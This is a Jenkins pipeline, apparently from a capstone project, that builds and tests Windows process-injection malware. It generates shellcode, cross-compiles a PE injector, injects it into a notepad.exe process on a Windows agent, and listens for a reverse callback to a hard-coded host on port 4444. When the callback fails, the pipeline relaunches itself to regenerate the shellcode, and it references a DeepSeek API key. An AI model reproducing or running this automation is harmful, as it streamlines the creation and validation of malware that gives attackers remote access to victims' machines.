pipeline {
    agent none

    environment {
        DEEPSEEK_CREDENTIALS = credentials('deepseek-api-key')
        LHOST = '100.85.95.64'
        LPORT = 4444
        MALWARE_DIR = 'Simple/PE-Injector/PE-Injector.cpp'
        EXECUTABLE_NAME = 'injector.exe'
    }

    stages {
        stage('Checkout Code') {
            agent { label 'linux' }
            steps {
                checkout([
                    $class: 'GitSCM',
                    branches: [[name: 'staging']],
                    userRemoteConfigs: [[
                        url: 'git@github.com:sapph2c/capstone.git',
                        credentialsId: 'git-ssh'
                    ]]
                ])
            }
        }

        stage('Generate shellcode') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh '''
                    make all
                    '''
                }
            }
        }

        stage('Compile the Malware') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh '''
                    x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_DIR -lpsapi
                    '''
                    stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                }
            }
        }

        stage('Execute Malware and Test Callback') {
            agent none
            stages {
                stage('Start Listener') {
                    agent { label 'linux' }
                    steps {
                        script {
                            dir('scripts') {
                                sh '''
                                uv install
                                (uv run pipeline callback; echo $? > callback_result.txt) &
                                echo $! > listener.pid
                                '''
                            }
                        }
                    }
                }

                stage('Run Malware') {
                    agent { label 'windows' }
                    steps {
                        dir('malware') {
                            unstash 'compiled_malware'
                            bat '''
                            powershell -Command "$proc = Start-Process -FilePath 'notepad.exe' -PassThru; Start-Sleep -Seconds 2; $pid = $proc.Id; Write-Output 'Target PID: ' + $pid; Start-Process -FilePath '.\\injector.exe' -ArgumentList $pid"
                            '''
                        }
                    }
                }

                stage('Wait for Callback and Evaluate Result') {
                    agent { label 'linux' }
                    steps {
                        script {
                            dir('scripts') {
                                // Wait for listener to exit and read its result
                                sh '''
                                echo "[*] Waiting for listener to complete..."
                                while kill -0 $(cat listener.pid) 2>/dev/null; do sleep 1; done
                                '''

                                def result = sh(script: 'cat callback_result.txt', returnStdout: true).trim()
                                echo "Callback listener exited with code: ${result}"

                                if (result != '0') {
                                    currentBuild.description = 'Callback failed — restarting from Generate Shellcode'
                                    build job: env.JOB_NAME,
                                  parameters: [
                                      string(name: 'RESTART_STAGE', value: 'generate')
                                  ],
                                  wait: false
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
